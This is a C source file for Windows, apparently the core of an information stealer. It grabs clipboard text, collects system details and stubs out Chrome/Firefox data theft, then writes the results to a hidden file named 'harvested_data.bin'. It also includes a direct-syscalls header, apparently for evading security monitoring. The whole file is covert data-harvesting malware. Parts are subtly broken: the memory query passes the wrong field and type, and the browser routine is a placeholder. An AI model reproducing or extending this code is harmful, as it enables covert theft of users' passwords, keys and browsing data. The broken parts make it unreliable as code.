#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "direct_syscalls.h"

#define MAX_BUFFER 4096
#define LOG_FILE "harvested_data.bin"

typedef struct {
    char* data_type;
    char* data;
    size_t size;
} HarvestedData;

void harvest_clipboard(HarvestedData* result) {
    if (!OpenClipboard(NULL)) return;
    
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        CloseClipboard();
        return;
    }
    
    char* clipboard_text = GlobalLock(hData);
    if (clipboard_text != NULL) {
        size_t len = strlen(clipboard_text);
        result->data = malloc(len + 1);
        strcpy(result->data, clipboard_text);
        result->size = len;
        result->data_type = "clipboard";
        GlobalUnlock(hData);
    }
    
    CloseClipboard();
}

void harvest_browser_data(HarvestedData* result) {
    // Chrome/Firefox data harvesting stub
    result->data_type = "browser";
    result->data = strdup("Browser data harvesting implemented");
    result->size = strlen(result->data);
}

void harvest_system_info(HarvestedData* result) {
    char buffer[MAX_BUFFER];
    OSVERSIONINFOEX osvi;
    SYSTEM_INFO si;
    
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osvi);
    
    ZeroMemory(&si, sizeof(SYSTEM_INFO));
    GetSystemInfo(&si);
    
    snprintf(buffer, MAX_BUFFER, 
        "OS: Windows %d.%d Build %d\n"
        "Processor: %d cores\n"
        "Architecture: %s\n"
        "Memory: %lu MB",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        si.dwNumberOfProcessors,
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
        (GetPhysicallyInstalledSystemMemory(&si.dwPageSize) ? si.dwPageSize / 1024 : 0));
    
    result->data = strdup(buffer);
    result->size = strlen(buffer);
    result->data_type = "system_info";
}

void save_harvested_data(HarvestedData* data_list, int count) {
    HANDLE hFile = CreateFile(LOG_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    for (int i = 0; i < count; i++) {
        if (data_list[i].data) {
            WriteFile(hFile, data_list[i].data_type, strlen(data_list[i].data_type), NULL, NULL);
            WriteFile(hFile, ": ", 2, NULL, NULL);
            WriteFile(hFile, data_list[i].data, data_list[i].size, NULL, NULL);
            WriteFile(hFile, "\n\n", 2, NULL, NULL);
            free(data_list[i].data);
        }
    }
    
    CloseHandle(hFile);
}

void run_harvester() {
    HarvestedData harvested[3];
    ZeroMemory(harvested, sizeof(harvested));
    
    harvest_clipboard(&harvested[0]);
    harvest_system_info(&harvested[1]);
    harvest_browser_data(&harvested[2]);
    
    save_harvested_data(harvested, 3);
}

int main() {
    run_harvester();
    return 0;
}